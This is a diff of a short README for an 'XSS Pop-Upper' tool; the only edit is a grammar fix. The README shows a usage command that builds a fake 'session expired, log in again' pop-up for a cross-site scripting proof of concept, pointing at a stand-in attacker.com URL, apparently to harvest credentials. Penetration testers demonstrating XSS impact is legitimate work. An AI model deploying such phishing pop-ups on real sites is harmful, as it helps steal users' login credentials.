@@ -1,5 +1,5 @@
 # XSS Pop-Upper
-This Javascript file create a pop-up for your XSS PoC.
+This Javascript file creates a pop-up for your XSS PoC.
 
 # Usage
 `python xss-popupper.py --url "http://attacker.com" --title "Log-in for session" --body "Your session has expired. Please log-in again" --time 5000`
